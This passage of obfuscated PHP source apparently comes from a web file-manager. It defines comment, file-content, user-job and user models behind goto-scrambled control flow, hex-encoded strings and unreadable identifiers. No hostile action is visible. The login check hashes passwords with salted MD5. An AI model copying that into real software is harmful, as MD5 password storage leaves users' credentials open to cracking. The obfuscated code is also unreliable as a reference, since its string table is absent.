Task::restart($CäƒÍóÅ[$C¼äŸ’íŒ[392]]); } } goto CÂö¦ÃÑîô; A÷Á©¦‹…†: } public function process() { $bªíåÊé‘å =& $_SERVER[¬ı§†‰ú˜¼]; return array($bªíåÊé‘å[719] => Task::get($bªíåÊé‘å[742]), $bªíåÊé‘å[723] => Task::get($bªíåÊé‘å[772]), $bªíåÊé‘å[192] => Task::get($bªíåÊé‘å[782])); } public function restore() { $F‘°æëÒÜ =& $_SERVER[¬ı§†‰ú˜¼]; ActionCall($F‘°æëÒÜ[1017], !0, 1); ActionCall($F‘°æëÒÜ[1017], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\145\x6e\164"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\x61\x6d\145" => "\143\x6f\155\155\145\x6e\x74\137\155\x65\x74\x61", "\155\145\164\141\106\x69\145\154\x64" => "\x63\x6f\155\x6d\x65\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($eŒ³î³‚’­) { $DŠ‚Ö±¶ =& $_SERVER[¬ı§†‰ú˜¼]; if ($eŒ³î³‚’­[$DŠ‚Ö±¶[1718]]) { $aôò…‡Ä–ƒ = $this->where(array($DŠ‚Ö±¶[1719] => $eŒ³î³‚’­[$DŠ‚Ö±¶[1718]]))->find(); if (!$aôò…‡Ä–ƒ || $aôò…‡Ä–ƒ[$DŠ‚Ö±¶[402]] != $eŒ³î³‚’­[$DŠ‚Ö±¶[402]] || $aôò…‡Ä–ƒ[$DŠ‚Ö±¶[482]] != $eŒ³î³‚’­[$DŠ‚Ö±¶[482]]) { return !1; } $this->where(array($DŠ‚Ö±¶[1719] => $eŒ³î³‚’­[$DŠ‚Ö±¶[1718]]))->setAdd($DŠ‚Ö±¶[1720], 1); } $eŒ³î³‚’­[$DŠ‚Ö±¶[1721]] = 0; $eŒ³î³‚’­[$DŠ‚Ö±¶[1720]] = 0; $eŒ³î³‚’­[$DŠ‚Ö±¶[714]] = 1; return $this->add($eŒ³î³‚’­); } public function commentCount($e¢•é‚Ùí, $EöÚ¾ÅÛæ) { goto Eîí‘ÚÈŠÁ; Eîí‘ÚÈŠÁ: $eÆØ¼³ìÏ© =& $_SERVER[¬ı§†‰ú˜¼]; if (!$e¢•é‚Ùí) { return array(); } if (is_string($e¢•é‚Ùí) || is_int($e¢•é‚Ùí)) { $e¢•é‚Ùí = array($e¢•é‚Ùí); } goto d—¼ï…ÎÄË; bÙÏâ“œÁ: return array_to_keyvalue($Cº‡áä‡§ , $eÆØ¼³ìÏ©[482], $eÆØ¼³ìÏ©[478]); goto Eá»‰øŸ×¢; d—¼ï…ÎÄË: $A¤”öéø¢Ô = array($eÆØ¼³ìÏ©[482], $eÆØ¼³ìÏ©[1722] => $eÆØ¼³ìÏ©[478]); $cµ­äÉÚ¦‰ = array($eÆØ¼³ìÏ©[482] => array($eÆØ¼³ìÏ©[7], $e¢•é‚Ùí), $eÆØ¼³ìÏ©[402] => $EöÚ¾ÅÛæ); $Cº‡áä‡§  = $this->field($A¤”öéø¢Ô)->where($cµ­äÉÚ¦‰)->group($eÆØ¼³ìÏ©[482])->select(); goto bÙÏâ“œÁ; Eá»‰øŸ×¢: } public function remove($dì÷»Üøã) { $d†‡ØİŸ£ =& $_SERVER[¬ı§†‰ú˜¼]; $dÖô¡Õˆ = array($d†‡ØİŸ£[1719] => $dì÷»Üøã); $cÊÙƒº×å = $this->where($dÖô¡Õˆ)->find(); if ($cÊÙƒº×å[$d†‡ØİŸ£[1718]]) { $this->where(array($d†‡ØİŸ£[1719] => $cÊÙƒº×å[$d†‡ØİŸ£[1718]]))->setAdd($d†‡ØİŸ£[1720], -1); } return $this->where($dÖô¡Õˆ)->delete(); } public function edit($a¦äÃ²×æÂ, $e£Ä¾†Ÿ) { $aŸœ”È™™ =& $_SERVER[¬ı§†‰ú˜¼]; $E¦‡—›ñìÏ = array($aŸœ”È™™[1719] => $a¦äÃ²×æÂ); return $this->where($E¦‡—›ñìÏ)->save(array($aŸœ”È™™[1723] => $e£Ä¾†Ÿ)); } public function prasise($d¾©–ÚÒ·) { $bÔÖ§ƒ¡Öò =& $_SERVER[¬ı§†‰ú˜¼]; $FÀÂ“»†ïš = Model($bÔÖ§ƒ¡Öò[1724]); $eÉ‘‚õÆª = array($bÔÖ§ƒ¡Öò[1719] => $d¾©–ÚÒ·, $bÔÖ§ƒ¡Öò[1519] => USER_ID); $BÇ²«‡í¡É = $FÀÂ“»†ïš->where($eÉ‘‚õÆª)->find(); if (!$BÇ²«‡í¡É) { $FÀÂ“»†ïš->add($eÉ‘‚õÆª); $e¥‚çŞ‡ ‰ = $this->where(array($bÔÖ§ƒ¡Öò[1719] => $d¾©–ÚÒ·))->setAdd($bÔÖ§ƒ¡Öò[1721], 1); } else { $FÀÂ“»†ïš->where($eÉ‘‚õÆª)->delete(); $e¥‚çŞ‡ ‰ = $this->where(array($bÔÖ§ƒ¡Öò[1719] => $d¾©–ÚÒ·))->setAdd($bÔÖ§ƒ¡Öò[1721], -1); } return $e¥‚çŞ‡ ‰; } public function targetInfo($A›¢˜åÑ©‘, $d”ÉÓäœÅ) { goto E’”™‰Ä; c®ÓÄ¿“½¼: return $bâ†§’¿¶Ì; goto dç¿Õ ¾İ¤; E’”™‰Ä: $b‚‡ËÍ­çã =& $_SERVER[¬ı§†‰ú˜¼]; $C‡¾’ÑĞÜ = array($b‚‡ËÍ­çã[548] => $A›¢˜åÑ©‘, $b‚‡ËÍ­çã[549] => $d”ÉÓäœÅ); $d”¦¸™îª = $this->where($C‡¾’ÑĞÜ)->count(); goto a‡¸ÒÅ‹é; a‡¸ÒÅ‹é: $cÄ¿‰´¸¯‘ = "\x52\x49\x47\110\124\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\143\x6f\x6d\x6d\145\156\164\137\160\162\141\x69\x73\x65\x20\163\164\141\x72\40\157\x6e\x20\x63\x6f\155\x6d\x65\x6e\164\x2e\143\157\155\155\145\x6e\164\111\104\40\x3d\40\x73\164\x61\x72\56\x63\157\x6d\155\x65\x6e\164\x49\104"; $Bªæ““èğ½ = $this->alias($b‚‡ËÍ­çã[351])->where($C‡¾’ÑĞÜ)->join($cÄ¿‰´¸¯‘, $b‚‡ËÍ­çã[1725])->count(); $bâ†§’¿¶Ì = array($b‚‡ËÍ­çã[1726] => $d”¦¸™îª, $b‚‡ËÍ­çã[1727] => $Bªæ““èğ½); goto c®ÓÄ¿“½¼; dç¿Õ ¾İ¤: } public function listData($EÖ–Î“¶˜½) { $D£ÍÖ•È¾× =& $_SERVER[¬ı§†‰ú˜¼]; if (isset($EÖ–Î“¶˜½[$D£ÍÖ•È¾×[1728]])) { if ($EÖ–Î“¶˜½[$D£ÍÖ•È¾×[1728]]) { $EÖ–Î“¶˜½[$D£ÍÖ•È¾×[1729]] = array($D£ÍÖ•È¾×[970], intval($EÖ–Î“¶˜½[$D£ÍÖ•È¾×[1728]])); } unset($EÖ–Î“¶˜½[$D£ÍÖ•È¾×[1728]]); } if (isset($EÖ–Î“¶˜½[$D£ÍÖ•È¾×[1730]])) { if ($EÖ–Î“¶˜½[$D£ÍÖ•È¾×[1730]]) { $EÖ–Î“¶˜½[$D£ÍÖ•È¾×[1729]] = array($D£ÍÖ•È¾×[967], intval($EÖ–Î“¶˜½[$D£ÍÖ•È¾×[1730]])); } unset($EÖ–Î“¶˜½[$D£ÍÖ•È¾×[1730]]); } return $this->_listData($EÖ–Î“¶˜½); } private function _listData($bÖ…¨¬æ™å) { $d¤Ç”Ê¥„¤ =& $_SERVER[¬ı§†‰ú˜¼]; $a½…ø³êİƒ = $this->where($bÖ…¨¬æ™å)->_makeOrder()->selectPage(100); $this->_listAppendParent($a½…ø³êİƒ[$d¤Ç”Ê¥„¤[366]]); $this->_listAppendUser($a½…ø³êİƒ[$d¤Ç”Ê¥„¤[366]]); $this->_listAppendMeta($a½…ø³êİƒ[$d¤Ç”Ê¥„¤[366]]); return $a½…ø³êİƒ; } private function _makeOrder() { $fÈ§š·¸Œ™ =& $_SERVER[¬ı§†‰ú˜¼]; $DœôœÚ¢© = array($fÈ§š·¸Œ™[1721], $fÈ§š·¸Œ™[1720], $fÈ§š·¸Œ™[193]); $Añ¼¦©‡Ã = Input::get($fÈ§š·¸Œ™[433], $fÈ§š·¸Œ™[7], $fÈ§š·¸Œ™[414], $DœôœÚ¢©); $e†® ²¿ = Input::get($fÈ§š·¸Œ™[434], $fÈ§š·¸Œ™[7], $fÈ§š·¸Œ™[1521], array($fÈ§š·¸Œ™[1731], $fÈ§š·¸Œ™[429])); $cÏ®…äÍ¦ì = $Añ¼¦©‡Ã . $fÈ§š·¸Œ™[50] . $e†® ²¿; return $this->order($cÏ®…äÍ¦ì); } private function _listAppendParent(&$eÔôóäÓ±) { goto A¾›´±—ê‰; A¾›´±—ê‰: $Fò²ìª ˜± =& $_SERVER[¬ı§†‰ú˜¼]; $cç¤šÊÓÉ’ = array_unique(array_to_keyvalue($eÔôóäÓ±, $Fò²ìª ˜±[33], $Fò²ìª ˜±[1718])); $cç¤šÊÓÉ’ = array_remove_value($cç¤šÊÓÉ’, $Fò²ìª ˜±[495]); goto AçÍ¥ØÕ­í; AçÍ¥ØÕ­í: if (!$cç¤šÊÓÉ’) { return; } $eœ“ê‚¶—™ = $this->where(array($Fò²ìª ˜±[1719] => array($Fò²ìª ˜±[7], $cç¤šÊÓÉ’)))->select(); $eœ“ê‚¶—™ = array_to_keyvalue($eœ“ê‚¶—™, $Fò²ìª ˜±[1729]); goto CâŒµÂ Î•; CâŒµÂ Î•: foreach ($eÔôóäÓ± as &$E„Ôªåù’è) { if (isset($eœ“ê‚¶—™[$E„Ôªåù’è[$Fò²ìª ˜±[1718]]])) { $E„Ôªåù’è[$Fò²ìª ˜±[1732]] = $eœ“ê‚¶—™[$E„Ôªåù’è[$Fò²ìª ˜±[1718]]]; } } unset($E„Ôªåù’è); goto aïŒ—ÄçŠˆ; aïŒ—ÄçŠˆ: } private function _listAppendUser(&$EÛ³Èãù…) { goto E‘¤ù®­´§; aá×Ô®±: if (count($C“°‡„æêô) == 0) { return; } foreach ($EÛ³Èãù… as $a¹­‚…ğ¦‰) { if (isset($a¹­‚…ğ¦‰[$céÁéĞ‰Ä­[1732]])) { $C“°‡„æêô[] = $a¹­‚…ğ¦‰[$céÁéĞ‰Ä­[1732]][$céÁéĞ‰Ä­[1527]]; } } $cÈÇ«Éö¤ = Model($céÁéĞ‰Ä­[505])->userListInfo($C“°‡„æêô); goto F£ÎÂ©¬Í¥; F£ÎÂ©¬Í¥: foreach ($EÛ³Èãù… as &$a¹­‚…ğ¦‰) { $a¹­‚…ğ¦‰[$céÁéĞ‰Ä­[561]] = $cÈÇ«Éö¤[$a¹­‚…ğ¦‰[$céÁéĞ‰Ä­[1527]]]; if (isset($a¹­‚…ğ¦‰[$céÁéĞ‰Ä­[1732]])) { $a¹­‚…ğ¦‰[$céÁéĞ‰Ä­[1732]][$céÁéĞ‰Ä­[561]] = $cÈÇ«Éö¤[$a¹­‚…ğ¦‰[$céÁéĞ‰Ä­[1732]][$céÁéĞ‰Ä­[1527]]]; } } unset($a¹­‚…ğ¦‰); goto dôÎ‡›ÊãÏ; E‘¤ù®­´§: $céÁéĞ‰Ä­ =& $_SERVER[¬ı§†‰ú˜¼]; $C“°‡„æêô = array_unique(array_to_keyvalue($EÛ³Èãù…, $céÁéĞ‰Ä­[33], $céÁéĞ‰Ä­[1527])); $C“°‡„æêô = array_remove_value($C“°‡„æêô, $céÁéĞ‰Ä­[495]); goto aá×Ô®±; dôÎ‡›ÊãÏ: } private function _listAppendMeta(&$EÓè¢ÛÂÈ) { goto CŠ›Şª¤óŸ; e™ ÅÃ„Í²: if (!$DÒ”ÈšŞ‹‘) { return; } foreach ($EÓè¢ÛÂÈ as $d®İùñ ¤‡) { if (isset($d®İùñ ¤‡[$bÆè¿ƒöì¡[1732]])) { $DÒ”ÈšŞ‹‘[] = $d®İùñ ¤‡[$bÆè¿ƒöì¡[1732]][$bÆè¿ƒöì¡[1729]]; } } $e†É•ø†Ö¤ = $this->metaList($DÒ”ÈšŞ‹‘); goto b‘ÂÎ…´’¿; CŠ›Şª¤óŸ: $bÆè¿ƒöì¡ =& $_SERVER[¬ı§†‰ú˜¼]; $DÒ”ÈšŞ‹‘ = array_unique(array_to_keyvalue($EÓè¢ÛÂÈ, $bÆè¿ƒöì¡[33], $bÆè¿ƒöì¡[1729])); $DÒ”ÈšŞ‹‘ = array_remove_value($DÒ”ÈšŞ‹‘, $bÆè¿ƒöì¡[495]); goto e™ ÅÃ„Í²; b‘ÂÎ…´’¿: if (!$e†É•ø†Ö¤) { return !1; } foreach ($EÓè¢ÛÂÈ as &$d®İùñ ¤‡) { $d®İùñ ¤‡[$bÆè¿ƒöì¡[443]] = $e†É•ø†Ö¤[$d®İùñ ¤‡[$bÆè¿ƒöì¡[1729]]]; if (isset($d®İùñ ¤‡[$bÆè¿ƒöì¡[1732]])) { $d®İùñ ¤‡[$bÆè¿ƒöì¡[1732]][$bÆè¿ƒöì¡[443]] = $e†É•ø†Ö¤[$d®İùñ ¤‡[$bÆè¿ƒöì¡[1732]][$bÆè¿ƒöì¡[1729]]]; } } unset($d®İùñ ¤‡); goto aÙ˜‡§Ú×•; aÙ˜‡§Ú×•: } private function metaList($d”¡“É©à¹) { goto b‘æ«ŒÏá; b›³ÄìÙˆ¡: $e‚ÖÔİ‘‰¢ = Model($c¨îÈØŸ¦Ç[1733])->where($A¢À¢ÅˆÉ)->select(); $e‚ÖÔİ‘‰¢ = array_to_keyvalue_group($e‚ÖÔİ‘‰¢, $c¨îÈØŸ¦Ç[1729]); foreach ($e‚ÖÔİ‘‰¢ as $AÛï”ŠÒåŠ => $E«¹äÃ¬›ƒ) { $eŸ˜ÙÂŒ = array(); foreach ($E«¹äÃ¬›ƒ as $dğâËÊ¶‡ƒ) { $eŸ˜ÙÂŒ[$dğâËÊ¶‡ƒ[$c¨îÈØŸ¦Ç[93]]] = $dğâËÊ¶‡ƒ[$c¨îÈØŸ¦Ç[371]]; } $e‚ÖÔİ‘‰¢[$AÛï”ŠÒåŠ] = $eŸ˜ÙÂŒ; } goto F¤òøÌÌŠ; F¤òøÌÌŠ: return $e‚ÖÔİ‘‰¢ ? $e‚ÖÔİ‘‰¢ : array(); goto b––ñ¼Íê; b‘æ«ŒÏá: $c¨îÈØŸ¦Ç =& $_SERVER[¬ı§†‰ú˜¼]; if (!$d”¡“É©à¹) { return array(); } $A¢À¢ÅˆÉ = array($c¨îÈØŸ¦Ç[1729] => array($c¨îÈØŸ¦Ç[7], $d”¡“É©à¹)); goto b›³ÄìÙˆ¡; b––ñ¼Íê: } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\154\x65\137\143\157\x6e\x74\145\x6e\164\x73"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\x65\124\151\155\145", "\164\151\155\145", "\151\156\163\145\x72\x74", "\x66\x75\x6e\143\x74\151\157\x6e")); } goto A¬®‰´ì; F‹‡…„Ğ™Š: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x6a\x6f\x62\x4c\151\163\164"; public $field = array("\156\x61\155\x65", "\x64\x65\163\x63", "\x73\157\162\x74"); const JOB_KEY = "\163\x65\x6c\146\x4a\x6f\142\114\151\x73\x74"; public function listData($CÒ ®®‹óÏ = false, $EÈ¥éïñì‡ = "\x73\157\x72\x74", $C¿™íÛ‡×Í = false) { return parent::listData($CÒ ®®‹óÏ, $EÈ¥éïñì‡, $C¿™íÛ‡×Í); } public function remove($c”Ğß¨½£æ) { return parent::remove($c”Ğß¨½£æ); } public function add($eøÃª–ÓÉ) { $eìîè‚„ =& $_SERVER[¬ı§†‰ú˜¼]; if ($this->findByName($eøÃª–ÓÉ[$eìîè‚„[28]])) { return !1; } $eøÃª–ÓÉ[$eìîè‚„[1713]] = $this->getSort(); return parent::insert($eøÃª–ÓÉ); } private function getSort() { $c‘õóÆ½Ğ¦ =& $_SERVER[¬ı§†‰ú˜¼]; $côá±Ãï†¯ = parent::listData(); $dÉç×È™ª = array_to_keyvalue($côá±Ãï†¯, $c‘õóÆ½Ğ¦[33], $c‘õóÆ½Ğ¦[1713]); return empty($dÉç×È™ª) ? 0 : max($dÉç×È™ª) + 1; } public function update($BÂâº×ùË, $A§¸§¥±œ) { $a’šğê«ÊÆ =& $_SERVER[¬ı§†‰ú˜¼]; $cô£¦ËòÚ = parent::listData($BÂâº×ùË); $AÃ”º‚—Ê² = $this->findByName($A§¸§¥±œ[$a’šğê«ÊÆ[28]]); if (!$cô£¦ËòÚ || $AÃ”º‚—Ê² && $AÃ”º‚—Ê²[$a’šğê«ÊÆ[392]] != $cô£¦ËòÚ[$a’šğê«ÊÆ[392]]) { return !1; } return parent::update($BÂâº×ùË, $A§¸§¥±œ); } public function setUserJob($c¯¿¸Á°ÉŞ, $D÷Šãù©Ş·) { goto E¢¤¡êÂø; Bóæ¥¶²ğ: $e½®Ä±Ôâ = rtrim($e½®Ä±Ôâ, $f‡ğôšÜĞ¦[47]); Model($f‡ğôšÜĞ¦[505])->metaSet($c¯¿¸Á°ÉŞ, self::JOB_KEY, $e½®Ä±Ôâ); goto FÇˆ„½„Ş; e‰®¾—’öŠ: $aÔŞ¾ºßáŠ = array_to_keyvalue($CèÈ­…¼, $f‡ğôšÜĞ¦[28]); $e½®Ä±Ôâ = $f‡ğôšÜĞ¦[374]; foreach ($D÷Šãù©Ş· as $C‘‹ªÔĞğƒ) { if ($aÔŞ¾ºßáŠ[$C‘‹ªÔĞğƒ]) { $e½®Ä±Ôâ .= $aÔŞ¾ºßáŠ[$C‘‹ªÔĞğƒ][$f‡ğôšÜĞ¦[392]] . $f‡ğôšÜĞ¦[47]; } else { $d×àâ½­¦ = $this->add($C‘‹ªÔĞğƒ); $e½®Ä±Ôâ .= $d×àâ½­¦ . $f‡ğôšÜĞ¦[47]; } } goto Bóæ¥¶²ğ; E¢¤¡êÂø: $f‡ğôšÜĞ¦ =& $_SERVER[¬ı§†‰ú˜¼]; if (!is_array($D÷Šãù©Ş·)) { $D÷Šãù©Ş· = array($D÷Šãù©Ş·); } $CèÈ­…¼ = parent::listData(); goto e‰®¾—’öŠ; FÇˆ„½„Ş: } public function getUserJob($DÊÔá“È) { $Eôí™İ = Model($_SERVER[¬ı§†‰ú˜¼][505])->metaGet($DÊÔá“È); return $this->getUserJobInfo($Eôí™İ[self::JOB_KEY]); } public function getUserJobInfo($fÌ´‡íé™) { goto eÃªØÚ£; eÃªØÚ£: $e«óº‰‡Ü =& $_SERVER[¬ı§†‰ú˜¼]; $e¸Ú“ò‘±º = explode($e«óº‰‡Ü[47], $fÌ´‡íé™); $Aù»ÔŞ×»½ = parent::listData(); goto b¸ÀÙï”‰¡; A”§Í«ÏÂ: return $DÁ²‚Ç¨Š¬; goto aµ…ÜÎù£æ; b¸ÀÙï”‰¡: $Aù»ÔŞ×»½ = array_remove_key($Aù»ÔŞ×»½, $e«óº‰‡Ü[193]); $DÁ²‚Ç¨Š¬ = array(); foreach ($e¸Ú“ò‘±º as $BÁâ¿¼òÔÌ) { if (isset($Aù»ÔŞ×»½[$BÁâ¿¼òÔÌ])) { $DÁ²‚Ç¨Š¬[] = $Aù»ÔŞ×»½[$BÁâ¿¼òÔÌ]; } } goto A”§Í«ÏÂ; aµ…ÜÎù£æ: } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\141\x6d\145" => "\x75\163\145\162\137\x6d\x65\x74\141", "\155\145\x74\141\x46\x69\145\154\x64" => "\x75\x73\145\162\111\x44"); protected $simpleField = "\x75\163\x65\162\111\x44\54\x6e\x69\143\153\116\x61\x6d\145\54\x6e\x61\155\x65\54\141\166\141\x74\141\x72\54\x73\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($DÅóÓñ“) { $cÃÆÀ©İê =& $_SERVER[¬ı§†‰ú˜¼]; $eÌò¼¿“«ë = $cÃÆÀ©İê[2112]; return array($cÃÆÀ©İê[1760] => array($DÅóÓñ“[0], $eÌò¼¿“«ë), $cÃÆÀ©İê[1762] => array($DÅóÓñ“[0], $eÌò¼¿“«ë), $cÃÆÀ©İê[2113] => array($DÅóÓñ“[0], $eÌò¼¿“«ë)); } protected function getInfo($bé‹Ü¸ø¾, $FŒ³ãØ†‡ = false) { $AÅĞ¬‹†š† = $this->getInfoSimple($bé‹Ü¸ø¾); if (!is_array($AÅĞ¬‹†š†)) { return array(); } if ($FŒ³ãØ†‡) { return $this->_getInfoApply($AÅĞ¬‹†š†); } return $this->cacheFunctionGet($_SERVER[¬ı§†‰ú˜¼][1769], $bé‹Ü¸ø¾); } protected function getInfoFull($C“½ÌµŒÄÑ, $cå—¯¼Ø = false) { $E¸Ê×ó‰Ü› = $this->getInfoSimple($C“½ÌµŒÄÑ); if (!is_array($E¸Ê×ó‰Ü›)) { return array(); } if ($cå—¯¼Ø) { return $this->_getInfoApply($E¸Ê×ó‰Ü›, !0); return $this->_getInfoApply($E¸Ê×ó‰Ü›, !0); } return $this->cacheFunctionGet($_SERVER[¬ı§†‰ú˜¼][2114], $C“½ÌµŒÄÑ); } private function _getInfoApply($BÄñï²™Ú, $F‹éº×§„ = false) { goto dİ÷ÊÜö†µ; B¯½İ…¡‰ì: $BÄñï²™Ú[$D·ö½‰¼ğ[85]][$D·ö½‰¼ğ[1950]] = isset($dÇÜ®÷¸ã­[$D·ö½‰¼ğ[1951]]) ? $dÇÜ®÷¸ã­[$D·ö½‰¼ğ[1951]] : null; if ($F‹éº×§„) { $BÄñï²™Ú[$D·ö½‰¼ğ[443]] = $this->metaGet($BÄñï²™Ú[$D·ö½‰¼ğ[1527]]); } return $BÄñï²™Ú; goto aÌè¥Åß„; dİ÷ÊÜö†µ: $D·ö½‰¼ğ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$BÄñï²™Ú) { return $BÄñï²™Ú; } $a†ŒËÓñê = md5($D·ö½‰¼ğ[2115] . $BÄñï²™Ú[$D·ö½‰¼ğ[848]] . $D·ö½‰¼ğ[2116] . $BÄñï²™Ú[$D·ö½‰¼ğ[28]]); goto bŸšËƒ“»í; bŸšËƒ“»í: $BÄñï²™Ú = $this->_listDataApplyItem($BÄñï²™Ú); $dÇÜ®÷¸ã­ = Model($D·ö½‰¼ğ[1204])->metaGet($BÄñï²™Ú[$D·ö½‰¼ğ[85]][$D·ö½‰¼ğ[394]]); $BÄñï²™Ú[$D·ö½‰¼ğ[2117]] = $a†ŒËÓñê; goto B¯½İ…¡‰ì; aÌè¥Åß„: } protected function getInfoSimple($E—¼•ÂÅ ‘, $f–Ôİğï÷ = false) { $e®‡ìÏ¸¦¸ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$E—¼•ÂÅ ‘) { return array(); } if ($f–Ôİğï÷) { $AŠË®Æ“¡Ù = $this->where(array($e®‡ìÏ¸¦¸[1527] => intval($E—¼•ÂÅ ‘)))->find(); if (!is_array($AŠË®Æ“¡Ù)) { return array(); } $AŠË®Æ“¡Ù[$e®‡ìÏ¸¦¸[2118]] = Action($e®‡ìÏ¸¦¸[2119])->parseUrl($AŠË®Æ“¡Ù[$e®‡ìÏ¸¦¸[2118]]); return $AŠË®Æ“¡Ù; } return $this->cacheFunctionGet($e®‡ìÏ¸¦¸[1763], $E—¼•ÂÅ ‘); } protected function getInfoSimpleOuter($BÚô±ËïÊ) { goto CçäøªÏ; CçäøªÏ: $Aã¤Ú§ŞÔ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$BÚô±ËïÊ || $BÚô±ËïÊ == 0) { return array($Aã¤Ú§ŞÔ[1527] => $Aã¤Ú§ŞÔ[495], $Aã¤Ú§ŞÔ[28] => $Aã¤Ú§ŞÔ[160] . LNG($Aã¤Ú§ŞÔ[2120]) . $Aã¤Ú§ŞÔ[503], $Aã¤Ú§ŞÔ[2118] => STATIC_PATH . $Aã¤Ú§ŞÔ[2121]); } $aö„•È ã² = $this->cacheFunctionGet($Aã¤Ú§ŞÔ[1763], $BÚô±ËïÊ); goto dªêÇÃèè; dªêÇÃèè: $c‘Ğğ“îÙŒ = array_field_key($aö„•È ã², explode($Aã¤Ú§ŞÔ[47], $this->simpleField)); if (!$c‘Ğğ“îÙŒ) { return array($Aã¤Ú§ŞÔ[1527] => $Aã¤Ú§ŞÔ[1084], $Aã¤Ú§ŞÔ[28] => $Aã¤Ú§ŞÔ[160] . LNG($Aã¤Ú§ŞÔ[2122]) . $Aã¤Ú§ŞÔ[503], $Aã¤Ú§ŞÔ[2118] => STATIC_PATH . $Aã¤Ú§ŞÔ[2123]); } $c‘Ğğ“îÙŒ[$Aã¤Ú§ŞÔ[2118]] = Action($Aã¤Ú§ŞÔ[2119])->parseUrl($c‘Ğğ“îÙŒ[$Aã¤Ú§ŞÔ[2118]]); goto A»¡ÊÊº‘Ì; A»¡ÊÊº‘Ì: return $c‘Ğğ“îÙŒ; goto f²Ì‰¼²°Š; f²Ì‰¼²°Š: } protected function groupUser($fÕøˆ¸ªÈô) { } public static function errorLang($B™á­š¹í) { $FÌù²¿Â†› =& $_SERVER[¬ı§†‰ú˜¼]; $bšç¼’¨µñ = array(self::ERROR_USER_NOT_EXISTS => $FÌù²¿Â†›[2124], self::ERROR_USER_PASSWORD_ERROR => $FÌù²¿Â†›[2125], self::ERROR_USER_EXIST_NAME => $FÌù²¿Â†›[2126], self::ERROR_USER_EXIST_PHONE => $FÌù²¿Â†›[2127], self::ERROR_USER_EXIST_EMAIL => $FÌù²¿Â†›[2128], self::ERROR_USER_LOGIN_LOCK => $FÌù²¿Â†›[2129], self::ERROR_IP_NOT_ALLOW => $FÌù²¿Â†›[2130], self::ERROR_USER_EXIST_NICKNAME => $FÌù²¿Â†›[2131]); return LNG($bšç¼’¨µñ[$B™á­š¹í]); } public function getInfoByMeta($c—ÀÕå™³, $E°À†œƒ÷) { $aÕÉÃ‡‹¦ô =& $_SERVER[¬ı§†‰ú˜¼]; $bô­°É›ÇŒ = Model($aÕÉÃ‡‹¦ô[2132])->where(array($aÕÉÃ‡‹¦ô[93] => $c—ÀÕå™³, $aÕÉÃ‡‹¦ô[371] => $E°À†œƒ÷))->find(); if ($bô­°É›ÇŒ) { return $this->getInfo($bô­°É›ÇŒ[$aÕÉÃ‡‹¦ô[1527]]); } return !1; } public function userLoginCheck($DÄ±ÕÜçâ´, $BøŸç¹½¼Ó) { $D•ÂÇ´‘âÑ =& $_SERVER[¬ı§†‰ú˜¼]; $b×ºÒİº‚” = $this->userLoginFind($DÄ±ÕÜçâ´); if (!$b×ºÒİº‚”) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($b×ºÒİº‚”[$D•ÂÇ´‘âÑ[1527]], $BøŸç¹½¼Ó)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($b×ºÒİº‚”[$D•ÂÇ´‘âÑ[1527]]); } public function userLoginFind($f¥¬¼ƒğÍ²) { $A›¼‘ÜØĞ¹ =& $_SERVER[¬ı§†‰ú˜¼]; $EƒİÛõ© = array($A›¼‘ÜØĞ¹[28] => $f¥¬¼ƒğÍ², $A›¼‘ÜØĞ¹[1954] => $f¥¬¼ƒğÍ², $A›¼‘ÜØĞ¹[302] => $f¥¬¼ƒğÍ², $A›¼‘ÜØĞ¹[2133] => $f¥¬¼ƒğÍ², $A›¼‘ÜØĞ¹[956] => $A›¼‘ÜØĞ¹[958]); if ($this->nickNameRpt()) { unset($EƒİÛõ©[$A›¼‘ÜØĞ¹[1954]]); } return $this->where($EƒİÛõ©)->find(); } public function clearCache($EÈÙˆÓ‡ÒÍ) { $DÊ¥´®½“¦ =& $_SERVER[¬ı§†‰ú˜¼]; $this->cacheFunctionClear($DÊ¥´®½“¦[1769], $EÈÙˆÓ‡ÒÍ); $this->cacheFunctionClear($DÊ¥´®½“¦[1763], $EÈÙˆÓ‡ÒÍ); $this->cacheFunctionClear($DÊ¥´®½“¦[2114], $EÈÙˆÓ‡ÒÍ); } public function userPasswordCheck($Eì¢øæ‹‚, $A„–“Ê‰) { $bÀ‹‰…“ =& $_SERVER[¬ı§†‰ú˜¼]; $A·Å†ôÃ© = $this->where(array($bÀ‹‰…“[1527] => intval($Eì¢øæ‹‚)))->find(); $DÕò…º‡Ÿø = $this->metaGet($Eì¢øæ‹‚); $E¬ğñˆÎÄ = isset($DÕò…º‡Ÿø[$bÀ‹‰…“[2134]]) ? $DÕò…º‡Ÿø[$bÀ‹‰…“[2134]] : $bÀ‹‰…“[33]; if (md5($E¬ğñˆÎÄ . trim($A„–“Ê‰)) !== $A·Å†ôÃ©[$bÀ‹‰…“[848]]) { return !1; } return !0; } public function userAdd($CŞ¿‹Œ„ˆ‰) { goto cœ·ñ·ôÚ; E Ùå©Î¯: $aÌÓ¢½âÍ = $this->_checkExist($CŞ¿‹Œ„ˆ‰); if ($aÌÓ¢½âÍ !== !0) { return $aÌÓ¢½âÍ; } $CŸ®ŠçÏ¯Æ = 